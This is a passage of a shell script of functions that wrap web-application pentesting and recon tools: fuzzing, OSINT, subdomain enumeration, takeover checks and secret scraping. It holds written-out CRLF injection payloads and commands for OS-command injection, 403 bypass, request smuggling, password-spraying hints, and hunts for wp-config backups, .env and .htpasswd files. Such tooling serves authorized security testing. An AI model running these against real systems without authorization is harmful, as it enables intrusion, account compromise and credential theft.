    ffuf -ac -acs advanced -r  -u $1/FUZZ/ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -v

    read -r resp\?"INPUT EXTENSION FOR BACKEND & BACKUP FUZZING: "
    if [[ ! -z $resp ]]; then
        ffuf -ac -acs advanced -r  -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e $resp,$resp.old,$resp.bak,$resp.tmp,$resp~,old,bak,tmp -v
    fi

    echo -e "\nSEARCHING ALL WEB EXTENSIONS\n"
    ffuf -ac -acs advanced -r  -u $1/FUF1FUF2 -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUF1 -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUF2 -v
}

bckfile(){
    echo -e "\nSEARCHING BACKUPS OF FILE \"$1\"\n"
    ~/TOOLS/bfac/bfac -u $1
}

# API Endpoint Search
apifuzz(){
    echo -e "\nCHECKING GRAPHQL EXPOSURES\n"
    python3 ~/TOOLS/graphw00f/main.py -d -f -t $1

    echo -e "\nREST ENDPOINT SEARCH ON TARGET\n"
    kr scan $1/ -w ~/WORDLISTS/routes-large.kite
}

# GET Parameter fuzzing
paramfuzz(){
    nuclei -up &> /dev/null && nuclei -ut &> /dev/null
    nuclei -u $1 -dast -headless -t dast/ -rl 25 -c 5
}

# GET/POST/Header discovery
paramscan(){
    echo "\nX8 SEARCH (GET/POST)\n"    
    x8 -u $1 -X GET POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

    echo -e "\nX8 SEARCH (JSON)\n"
    x8 -u $1 -X POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t json
}

# Header Discovery
headscan(){
    echo "\nSEARCHING HEADERS\n"
    x8 -u $1 -X $2 --headers -w /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/uppercase-headers
}

# 403 Bypasser
bypass(){
    echo -e "\nCOMMON ATTACKS\n"
    ~/TOOLS/bypass-403/bypass-403.sh $(echo $1 | unfurl format %s://%d) $(echo $1 | unfurl format %p | cut -c 2-)
    ~/TOOLS/4-ZERO-3/403-bypass.sh -u $1 --exploit

    echo -e "\nH2C SMUGGLING CHECK\n"
    ~/TOOLS/h2csmuggler/h2csmuggler.py -x $(echo $1 | unfurl format %s://%d) $1
}

# Host Reflections / Misroutings
vhost(){
    echo -e "\nCHECKING HOST MISROUTING (TOP-110000)\n"
    ffuf -mc all -ac -acs advanced -u $1 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.$(echo $1 | unfurl format %d)"
}

# Insecure GUID version check
guidcheck(){
    guidtool -i $1
}

# Joomla Scanning Function
joomscan(){
    echo -e "\nSCANNING JOOMLA INSTANCE \"$1\"\n"
    cur=$(pwd) && cd ~/TOOLS/joomscan && perl joomscan.pl --update && perl joomscan -u $1 -ec && cd $cur
}

# Wordpress scanning function
wordscan(){
    echo -e "\nENUMERATING COMPONENTS VIA WPSCAN\n"
    wpscan --api-token $wp_scan_api --url $1 --enumerate u,vp,vt,cb,dbe --rua

    echo -e "\nYOU CAN TEST PASSWORD SPRAYING VIA \"wpscan --url $1 --users USERS.txt --passwords PASS.txt\"\n"

    dom=$(echo $1 | unfurl format %d)
    root_domain=$(echo "$dom" | awk -F'.' '{print $(NF-1)"."$NF}' | cut -d':' -f1)

    echo -e "\nCHECKING OEMBED SSRF\n"
    ssrfoem=$(curl -kLs "$1/wp-json/oembed/1.0/proxy?url=foo.com" -s -o /dev/null -w "%{http_code}")
    ssrfoem2=$(curl -kLs "$1/wp-json/oembed/1.0/proxy?url=foo.com" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/oembed/1.0/proxy?url=foo.com\" -> $ssrfoem"
    echo -e "\"$1/?rest_route=/oembed/1.0/proxy?url=foo.com\" -> $ssrfoem2"

    echo -e "\nCHECKING XML-RPC/CRON EXPOSURE\n"
    xmlrpc=$(curl -kL -X POST "$1/xmlrpc.php" -s -o /dev/null -w "%{http_code}")
    wpcron=$(curl -kL -X POST "$1/wp-cron.php" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/xmlrpc.php\" -> $xmlrpc"
    echo -e "\"$1/wp-cron.php\" -> $wpcron" 

    echo -e "\nCHECKING FILE LISTING\n"
    upd_check1=$(curl -kLs "$1/wp-content/uploads" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-content/uploads\" -> $upd_check1\n"

    echo -e "\nCHECKING USER LISTINGS\n"
    case1=$(curl -kLs "$1/wp-json/wp/v2/users/" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/users\" -> $case1"

    case15=$(curl -kLs "$1/wp-json/wp/v2/users/1" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/users\" -> $case15"

    case17=$(curl -kLs "$1/?author=1" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/?author=1\" -> $case17"

    case2=$(curl -kLs "$1/wp-json/wp/v2/usERS" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/usERS\" -> $case2"

    case25=$(curl -kLs "$1/wp-json/wp/v2/usERS/1" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/usERS/1\" -> $case25"

    case3=$(curl -kLs "$1/?rest_route=/wp/v2/users" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/?rest_route=/wp/v2/users\" -> $case3"

    case35=$(curl -kLs "$1/?rest_route=/wp/v2/usERS" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/?rest_route=/wp/v2/usERS\" -> $case35"

    case4=$(curl -kLs "$1/wp-json/wp/v2/users?search=admin@$root_domain" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/users?search=admin@$dom\" -> $case4"

    case5=$(curl -kL "https://public-api.wordpress.com/rest/v1.1/sites/$dom/posts" -s -o /dev/null -w "%{http_code}")
    echo -e "\"$1/wp-json/wp/v2/users?search=admin@$dom\" -> $case5"

    echo -e "\nSCANNING FOR VULNERABLE COMPONENTS\n"
    nuclei -ut &> /dev/null && nuclei -up &> /dev/null
    nuclei -u $1 -t github/topscoder/nuclei-wordfence-cve -tags wp-core,wp-plugin,wp-themes -rl 25 -c 5 -es info

    echo -e "\nSEARCHING WP-CONFIG BACKUP EXPOSURES\n"
    ~/TOOLS/bfac/bfac -u $1/wp-config --threads 3 --level 4 | grep "Response-Code: 200"
}

# Cache Poisoning common misconfigurations
poison(){
    echo -e "\nCHECKING COMMON HEADERS\n"
    toxicache -i $1

    echo -e "\nCHECKING MORE HEADERS AND PARAMETERS\n"
    wcvs -u $1 --hw /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/uppercase-headers --pw  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
}

# Open Redirection scanner (GET parameters / URI Path)
redscan(){
    cur=$(pwd); cd ~/TOOLS/Oralyzer
    /home/kali/TOOLS/Oralyzer/venv/bin/python3 oralyzer.py -u $1
    cd $cur
}

# CRLF Scanning (GET parameters / URI Path)
crscan(){
    echo -e "\nCHECKING COMMON PATH CRLF INJECTION\n"
    echo "\"$1/%0D%0ASet-Cookie:mycookie=RANDCANARY\""
    curl -kILsX GET "$1/%0D%0ASet-Cookie:mycookie=RANDCANARY" |grep "RANDCANARY" | grep -i "set-cookie"

    echo "\"$1/%E5%98%8D%E5%98%8ASet-Cookie:mycookie=RANDCANARY\""
    curl -kILsX GET "$1/%E5%98%8D%E5%98%8ASet-Cookie:mycookie=RANDCANARY" | grep -i "set-cookie" | grep "RANDCANARY"

    echo "\"$1/%5Cr%5CnSet-Cookie:mycookie=RANDCANARY\""
    curl -kILsX GET "$1/%5Cr%5CnSet-Cookie:mycookie=RANDCANARY" |grep "RANDCANARY" | grep -i "set-cookie"

    echo "\"$1/%25u000ASet-Cookie:mycookie=RANDCANARY\""
    curl -kILsX GET "$1/%25u000ASet-Cookie:mycookie=RANDCANARY" |grep "RANDCANARY" | grep -i "set-cookie"

    echo "\"$1/%250ASet-Cookie:mycookie=RANDCANARY\""
    curl -kILsX GET "$1/%250ASet-Cookie:mycookie=RANDCANARY" |grep "RANDCANARY" | grep -i "set-cookie"

    echo -e "\nCHECKING EDGE CASES\n"
    cur=$(pwd); cd ~/TOOLS/Oralyzer
    python3 oralyzer.py -crlf -u $1
    cd $cur
}

# Common Reflected / Blind / DOM XSS Crawling
xsscan(){
    read -r xsscookie\?"INPUT COOKIE HEADER IF NEEDED: "
    if [[ -z $xsscookie ]]; then
        wingman -u $1 --crawl --exclude dom,path
    else
        wingman -u $1 --crawl -h "$xsscookie" --exclude dom,path
    fi
}

# SSTI / CSTI Injection
tplscan(){
    echo -e "\nTESTING SSTI / CSTI ON URL \"$1\"\n"
    tinja url -u "$1" --csti
}

# OS Injection Request Scanner
osscan(){
    echo -e "\nTESTING REQUEST \"$1\" FOR OS INJECTION"
    python3 ~/TOOLS/commix/commix.py --udpate
    python3 ~/TOOLS/commix/commix.py -r $1 --flush-session --ignore-session --batch --current-user --level=3
}

# CSSP URI Scan
ppscan(){
    echo $1 | ppmap
}

# HTTP Smuggler for POST-Allowing ULRs
smuggle(){
    echo -e "\nTESTING HTTP SMUGGLING\n"
    cd /home/kali/TOOLS/smuggler && python3 smuggler.py -u $1
}

#---------------------OSINT---------------------#
# ExploitDB Search
ssp(){
    searchsploit $1
}

# Username/e-mail tracking along internet
sherlock(){
    echo -e "\nSEARCHING USERNAME WITH SHERLOCK\n"
    cd ~/TOOLS/sherlock/sherlock; python3 sherlock.py $1; cd ~
}

# Shodan DB statistics lookup
hackstat(){
    top_results=50

    echo -e "Performing top $top_results search\n"
    shodan stats --facets org,domain,product,port,ip,http.title,vuln.verified --limit $top_results $1
}

# WayBackMachine GET parameter scraping
paramine(){
    echo -e "\nFETCHING PARAMETERS FROM DOMAIN\n"
    echo $1 | waymore -mode U && cat ~/.config/waymore/results/$1/waymore.txt | qsreplace FUZZ | grep FUZZ > $(echo $1 | unfurl format %d)_params.txt

    echo -e "\nFUZZING PARAMETERS\n"
    nuclei -up &> /dev/null && nuclei -ut &> /dev/null
    nuclei -ss host-spray -l $(echo $1 | unfurl format %d)_params.txt -dast -headless -t dast/ -rl 25 -c 5 -v
}

# Google fingerprinting for a root domain
gmine(){
    cur=$(pwd)
    cd /home/kali/TOOLS/GooFuzz

    ./GooFuzz -t $1 -d 15 -p 10 -s
    sleep 15    
    ./GooFuzz -t $1 -d 15 -p 10 -e ./wordlists/extensions.txt
    sleep 15

    echo -e "\nEXTRACTING USEFUL METADATA\n"
    metagoofil -d $1 -t 7z,avi,djvu,doc,docx,exe,iso,mov,mp4,pptx,ppt,rar,zip,pdf,txt,xls,xlsx -w -o metagoofil_$1
    exiftool -r ./metagoofil_$1/* | egrep -i "Author|Creator|Email|Producer|Template" | sort -u

    sleep 15
    ./GooFuzz -t $1 -d 15 -p 10 -w ./wordlists/words.txt  
    
    cd $cur
}

# WayBackMachine 200-URL Mining
urlmine(){
    httpx -up &>/dev/null
    echo $1 | waymore -mode U && cat ~/.config/waymore/results/$1/waymore.txt | httpx -random-agent -fr -mc 200 -silent -sc -server -title -cdn -cname
}

# WayBackMachine sensitive file mining
filemine(){
    echo -e "\nFETCHING RAW ARCHIVE DATA\n"
    echo $1 | waymore -mode U
    httpx -up &>/dev/null 

    echo -e "\nSEARCHING GOOGLE DRIVE / DOCS\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "(drive.google | docs.google)" | httpx -fr -mc 200

    echo -e "\nMINING PUBLIC ARCHIVES\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.zip$|\.rar$|\.tar$|\.gz$|\.7z$|\.bz2$|\.xz$|\.tar.gz$|\.tar.bz2$|\.tar.xz$|\.tar.7z$|\.tgz$|\.tbz2$|\.txz$|\.zipx$|\.gzip$" | httpx -fr -mc 200

    echo -e "\nMINING CONFIGURATION FILES\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.log$|\.txt$|\.syslog$|\.swf$\.ini$|\.cfg$|\.conf$|\.yaml$|\.yml$|\.properties$|\.xml$|\.axd$|\.json$|\.toml$|\.env$|\.config$|\.prefs$|\.cnf$|\.plist$|\.sql$|\.sqlite3$|\.kbdx$|\.htaccess$|\.htpasswd$|\.config$|\.sys$" | httpx -fr -mc 200

    echo -e "\nMINING BACKUP FILES\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.bak$|\.backup$|\.bkp$|\.old$|\.tmp$|\.~$|\.swp$|\.sav$" | httpx -fr -mc 200

    echo -e "\nMINING EXECUTABLE FILES\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -e "\.exe$|\.dll$|\.bat$|\.sh$|\.app$|\.jar$|\.msi$|\.vbs$|\.cmd$|\.go$|\.cpp$|\.c$|\.run$|\.py$|\.pl$|\.rb$|\.ps1$" | httpx -fr -mc 200

    echo -e "\nMINING NON-STANDARD PUBLIC DOCUMENTS\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.docx$|\.xlsx$|\.rtf$|\.csv$|\.xls$|\.psd$|\.odt$|\.mp4$" | httpx -fr -mc 200

    echo -e "\nSCRAPING JAVASCRIPT FILES FOR SECRETS/ENDPOINTS\n"
    cat ~/.config/waymore/results/$1/waymore.txt | grep -E "\.js$" | httpx -fr -mc 200 > js_files_$1.txt
    rm ~/.config/waymore/results/$1/waymore.txt
    while read -r uri; do jsmine $uri; done < js_files_$1.txt
}

# WHOIS Record Checker
whoiscan_ut(){
    whois $1
    whois -a "z $1*"
    whois -a "z @$1*"
    whois -a $1
}
whoiscan(){
    echo -e "\nREGISTRY DATA\n"
    whoiscan_ut $1 | grep -wiE "Registrant|Registrar" | sed -e 's/^[[:space:]]*//' | sort -u

    echo -e "\nSERVER DATA\n"
    whoiscan_ut $1 | grep -wiE "Server|Domain|ifaddr|local-as|DNSSEC|Updated|Page" | sed -e 's/^[[:space:]]*//' | sort -u

    echo -e "\nCONTACT DATA\n"
    whoiscan_ut $1 | grep -wiE "Email|Phone|Street|City|Postal|Fax" | sed -e 's/^[[:space:]]*//' | sort -u

    echo -e "\nADMIN DATA\n"
    whoiscan_ut $1 | grep -wiE "Admin" | sed -e 's/^[[:space:]]*//' | sort -u
}

# Passive subdomain enumeratio
subfind(){
echo -e "\nPASSIVE SOURCE ENUMERATION\n"
    chaos --update && chaos -d $1 -silent -key $chaos_key | anew -q subdomains_$1.txt
    amass enum -passive -norecursive -noalts -d $1 | anew -q subdomains_$1.txt
	subfinder -d $1 -config ~/.config/subfinder/config.yml -silent | anew -q subdomains_$1.txt
    echo $1 | haktrails subdomains | anew -q subdomains_$1.txt
	assetfinder --subs-only $1 | anew -q subdomains_$1.txt
    findomain -quiet -t $1 | anew -q subdomains_$1.txt; rm iet 2>/dev/null
    echo -e "\nFINISHED GETTING SUBDOMAINS\n"
}

# CIDR -> PTR Mapper
ptr(){
    dnsx --update &>/dev/null
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    asn_regex='^(AS)|(as)[0-9]+$'

    if [[ $1 =~ $asn_regex ]]; then
        whois -h whois.radb.net -- "-i origin $1" | grep -Eo "([0-9.]+){4}/[0-9]+" | anew -q cidr_$1.txt
        touch ptr_domains.txt && while read -r cidr; do echo $cidr | mapcidr -silent | dnsx -ptr -resp-only | anew -q ptr_domains.txt; done < cidr_$1.txt
    elif [[ $1 =~ $cidr_regex ]]; then
        echo $1 | mapcidr -silent | dnsx -ptr -resp-only | anew -q ptr_domains.txt
    else
        cat $1 | dnsx -ptr -resp-only | anew -q ptr_domains.txt
    fi
}

# DNS Resolving function
resolve(){
    echo -e "\nFETCHING RESOLVERS\n"
    wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/WORDLISTS/public_resolvers.txt

    echo -e "\nRESOLVING DOMAINS\n"
	puredns resolve $1 -w resolved.txt -r ~/WORDLISTS/public_resolvers.txt

    echo -e "\nFETCHING IP/CNAME RECORDS\n"
    massdns -r ~/WORDLISTS/public_resolvers.txt -t A -o S -w dns_records.txt resolved.txt
    grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' dns_records.txt > ipv4_addresses.txt
}

# DNS Bruteforcing function
subbrute(){
    echo -e "\nFETCHING RESOLVERS AND WORDLISTS\n"
    wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/WORDLISTS/public_resolvers.txt

    echo -e "BRUTEFORCING DNS NAMES\n"
    puredns bruteforce -r ~/WORDLISTS/public_resolvers.txt ~/WORDLISTS/subdomains.txt $1 --write bruteforce_resolved.txt 
}

# DNS Permuation function
subperm(){
    echo -e "\nFETCHING RESOLVERS AND WORDLISTS\n"
    wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O ~/WORDLISTS/public_resolvers.txt   

    echo -e "\nSEARCHING PERMUTATION DOMAINS\n"
    gotator -sub $1 -perm dns_permutations_list.txt -depth 1 -numbers 10 -mindup -adv -md | sort -u > sub_perms.txt

    echo -e "\nRESOLVING PERMUTED DOMAINS\n"
    puredns resolve ~/WORDLISTS/permutations.txt -r ~/WORDLISTS/public_resolvers.txt sub_perms.txt > permuted_resolved.txt; rm sub_perms.txt
}

# Subdomain Takeover function
takeover(){
    echo -e "\nTESTING NUCLEI TAKEOVERS\n"
    nuclei -up >/dev/null && nuclei -ut >/dev/null
    nuclei -l $1 -t http/takeovers -rl 25 -c 5

    echo -e "\nTESTING DNS TAKEOVERS\n"
    sudo service docker start
    sleep 1
    sudo docker run -it --rm -v $(pwd):/etc/dnsreaper punksecurity/dnsreaper file --filename /etc/dnsreaper/$1

    echo -e "\nTESTING SUBZY TAKEOVERS\n"
    subzy run --targets $1 --hide_fails --vuln
}

# Web application probing on resolved domains
webprobe(){
    mkdir WEB_SCAN && cd WEB_SCAN && cp ../$1 .

    echo -e "\nWEB PORT SCANNING\n"
    sudo /home/kali/.local/bin/unimap --fast-scan -f $1 --ports $COMMON_PORTS_WEB -q -k --url-output > web_unimap_scan
    rm -rf unimap_logs

    echo -e "\nFILTERING ALIVE APPLICATIONS\n"
    httpx -up &>/dev/null
    cat web_unimap_scan | httpx -random-agent -fr -silent -fc 404 -sc -server -title -td -cdn -cname -o websites_alive.txt

    echo -e "\nSCREENSHOOTING SERVICES\n"
    cat websites_alive.txt | awk -F" " '{print $1}' | sort -u > alive_urls.txt
    gowitness scan file -f alive_urls.txt --write-db && gowitness report server
}

# Alive Host IP/CIDR Scanning
alive(){
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    if [ -f ./$1 ]; then
        echo -e "\nNMAP SWEEPING\n"
        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep for | cut -d" " -f5 > alive_ips.txt

    elif [[ $1 =~ $cidr_regex ]]; then
        echo -e "\nNMAP SWEEPING\n"
        sudo nmap -n -sn -PE -PP -PM -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep for | cut -d" " -f5 > alive_ips.txt
    fi
}

# Passive Shodan Fingerprinting (CIDR / ASN / FILE)
shodscan(){
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    asn_regex='^(AS)|(as)[0-9]+$'

    if [[ $1 =~ $asn_regex ]]; then
        echo -e "\nDISPLAYING SHODAN STATISTICS\n"
        hackstat "asn:$1"
        whois -h whois.radb.net -- "-i origin $1" | grep -Eo "([0-9.]+){4}/[0-9]+" | mapcidr -silent | anew -q $1_IP.txt
        cat $1_IPS.txt | nrich -

    elif [[ $1 =~ $cidr_regex ]]; then
        echo -e "\nDISPLAYING SHODAN STATISTICS\n"
        hackstat "net:$1"

        echo -e "\nDISPLAYING HOSTS INFORMATION\n"
        filename=$(echo $1 | tr -d '/')
        echo $1 | mapcidr -silent | anew -q $filename.txt
        cat $filename.txt | nrich -

    else
        echo -e "\nDISPLAYING HOSTS INFORMATION\n"
        cat $1 | nrich -
    fi
}

# Active Fingerprinting (CIDR / FILE)
fingerprint(){
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    if [[ $1 =~ $cidr_regex ]]; then
        echo -e "\nTCP TOP-1000 SCAN\n"
        sudo masscan $1 --top-ports 100

        echo -e "\nUDPX FINGERPRINT\n"
        udpx -t $1 -c 128 -w 1000
    else
        echo -e "\nTCP TOP-100 SCAN\n"
        sudo masscan -iL $1 --top-ports 100

        echo -e "\nUDPX FINGERPRINT\n"
        udpx -tf $1 -c 128
    fi
}

# Host Mapping Search -> Using https://wordlists-cdn.assetnote.io/data/technologies
hostmap() {
    local search_string="$1"
    local hostmap_folder=~/WORDLISTS/HOSTMAP

    if [[ -z "$search_string" ]]; then
        echo "Usage: search_in_hostmap <string>"
        return 1
    fi

    for file in "$hostmap_folder"/*; do
        if [[ -f "$file" ]]; then
            # Extract filename without path and extension
            local filename=$(basename "$file" .txt)
            echo "Searching in $filename:"
            cat $file | grep $search_string | sort -u || echo "No match found"
            echo "" # Print a newline for better readability
        fi
    done
}

# Cloud assets searching
cloudfind(){
    echo -e "\nENUMERATING CLOUD SERVICES\n"
    root=$(echo $1 | cut -f1 -d'.')
    /home/kali/TOOLS/cloud_enum/venv/bin/python3 ~/TOOLS/cloud_enum/cloud_enum.py -k $1 -k $root
}

# -----------OPEN SOURCE TESTING-----------------#
# Github repository search
gitfind(){
    echo -e "\nSEARCHING REPOSITORY \"$1\"\n"
    trufflehog github --repo=$1 --only-verified
}

# Domain scraping on GitHub
gitscrape(){
    echo -e "\nSCRAPING DOMAIN ON GIT\n"
    cd ~/TOOLS/GitHound
    echo "\"$1\"" | ./git-hound --dig-files --dig-commits --many-results --results-only
}

# Semgrep repository scan
codescan(){
    echo -e "\nCHECKING FOLDER \"$1\" FOR MISCONFIGURATIONS\n"
    semgrep scan --config auto --pro $1
}
